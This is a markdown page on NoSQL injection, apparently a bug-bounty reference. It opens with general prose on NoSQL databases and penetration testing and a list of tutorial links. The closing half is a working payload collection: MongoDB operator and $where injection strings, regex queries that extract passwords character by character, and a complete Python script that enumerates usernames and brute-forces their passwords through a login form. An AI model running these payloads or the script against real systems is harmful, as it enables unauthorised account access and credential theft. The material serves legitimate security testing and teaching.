# NoSQL Injection

- [Introduction](#introduction)
- [Understanding NoSQL Databases](#understanding-nosql-databases)
- [Bug Bounties and NoSQL](#bug-bounty-programs-and-nosql)
- [Common NoSQL Vulnerabilities](#common-nosql-database-vulnerabilities)
- [Ethical Hacking and Penetration Testing](#ethical-hunting-and-penetration-testing)
- [Tutorials on NoSQL Injection](#tutorials-for-nosql-vulnerabilities)
- [Payloads for NoSQL Injection](#payloads-for-nosql)

# Introduction:
In the world of software development and information security, NoSQL (Not Only SQL) databases have gained significant popularity due to their scalability, flexibility, and high performance. These databases differ from traditional SQL databases by offering a schema-less structure, making them well-suited for handling large amounts of unstructured or semi-structured data. In the context of bug bounty programs, ethical hacking, and penetration testing, NoSQL databases present unique challenges and opportunities. This article explores the role of NoSQL in bug bounty programs and how it impacts ethical hunting and penetration testing.

### Understanding NoSQL Databases:
NoSQL databases are designed to handle big data requirements, enabling efficient storage and retrieval of large volumes of diverse data types. Unlike SQL databases, which rely on structured tables and predefined schemas, NoSQL databases employ various data models such as key-value stores, document stores, columnar databases, and graph databases. This flexibility allows developers to build scalable and distributed systems capable of handling dynamic data structures.

## Bug Bounty Programs and NoSQL:
Bug bounty programs have become a crucial component of many organizations' security strategies. By incentivizing ethical hackers to uncover vulnerabilities, organizations can identify and address potential security flaws before malicious actors exploit them. NoSQL databases, being widely adopted by modern applications, are often the focus of bug bounty programs.

### Common NoSQL Database Vulnerabilities:

Injection Attacks: Just like SQL databases, NoSQL databases are susceptible to injection attacks. NoSQL injection occurs when untrusted input is passed to query languages (e.g., MongoDB's query language) and allows an attacker to manipulate queries or access unauthorized data.

Authentication and Authorization Issues: Misconfigured access controls or weak authentication mechanisms can expose sensitive data in NoSQL databases. A bug bounty program can help identify these vulnerabilities and recommend stronger security measures.

Cross-Site Scripting (XSS): Although typically associated with web applications, NoSQL databases that expose data through user interfaces may also be vulnerable to XSS attacks. By injecting malicious scripts into user-supplied input, an attacker can manipulate the behavior of the NoSQL database's interface.

Denial-of-Service (DoS) Attacks: NoSQL databases may be vulnerable to DoS attacks, which aim to disrupt the availability of the system by overwhelming it with malicious requests or resource-intensive operations. Identifying and patching these vulnerabilities is crucial for maintaining the database's stability and reliability.

### Ethical Hunting and Penetration Testing:
Ethical hacking and penetration testing involve actively seeking vulnerabilities within a system or application to help improve its security posture. When it comes to NoSQL databases, ethical hunters and penetration testers face specific challenges:

Understanding Data Models: Given the variety of NoSQL data models, it is important for testers to have a strong understanding of the specific database technology being used. This includes comprehending the query language, data structures, and indexing mechanisms employed.

Validating Input and Query Sanitization: Testers must pay attention to how input data is processed and validated by the application before being passed to the NoSQL database. Ensuring proper input sanitization is critical to prevent injection attacks.

In-Depth Knowledge of Security Controls: Testers should be familiar with the security controls and features provided by the NoSQL database platform. This includes understanding authentication and authorization mechanisms, encryption options, and logging capabilities.

# Conclusion:
NoSQL databases have revolutionized the way data is stored and processed in modern applications. As bug bounty programs and ethical hacking initiatives continue to gain prominence, the need to address NoSQL-specific vulnerabilities becomes crucial. By actively testing and uncovering security flaws in NoSQL databases, ethical hunters and penetration testers play a vital role in improving the security of these systems. Organizations must invest in comprehensive bug bounty programs and penetration testing frameworks to ensure the resilience and integrity of their NoSQL database deployments.

### Tutorials for NoSQL Vulnerabilities

- [NoSQL Injection in MongoDB](https://zanon.io/posts/nosql-injection-in-mongodb/) - A detailed article explaining NoSQL Injection in MongoDB
- [Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection) - A pretty good tutorial by OWASP
- [NoSQL Injection Cheatsheet](https://nullsweep.com/nosql-injection-cheatsheet/) - A cheatsheet for NoSQL injection by Null Sweep
- [NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection) - A pretty good article explaining NoSQL Injection


### Payloads for NoSQL 

**SQL - Mongo**
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00

```

**Extract Length Information**
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...

```

**Extract Data Information**
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}

```

**SQL - Mongo**
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found

```

**MongoDB Payloads**

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1

```

**Brute Force Login Username and Passwords from POST Login**

```
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)

```